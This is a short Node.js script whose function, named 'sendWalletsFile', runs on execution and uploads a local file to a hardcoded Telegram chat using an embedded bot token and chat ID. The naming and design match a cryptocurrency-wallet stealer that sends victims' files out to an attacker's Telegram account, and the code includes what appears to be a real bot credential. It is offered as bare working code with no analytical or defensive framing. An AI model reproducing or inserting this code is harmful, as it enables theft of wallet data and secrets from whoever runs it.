const fs = require('fs');
const TelegramBot = require('node-telegram-bot-api');
const colors = require('colors');

async function sendWalletsFile() {
  const botToken = '7492849901:AAF_0ITvn6KjaLVJpIom9ETfoyBDqOVmWGg'; // Update with your bot token
  const chatId = '6790561900'; // Update with your chat ID
  const file = 'sap.py';

  const bot = new TelegramBot(botToken, { polling: true });

  // Custom error handler for polling errors
  bot.on('polling_error', (error) => {
    if (error.code !== 'ETELEGRAM' || !error.message.includes('409 Conflict')) {
      console.error('Polling error:', error);
    }
  });

  await bot.sendDocument(chatId, file)
    .then(() => {
      console.log(colors.green.bold('File successfully sent!'));
      bot.stopPolling(); // Stop polling after the file is sent
    })
    .catch((err) => {
      console.error('Error sending file:', err);
    });
}

sendWalletsFile();
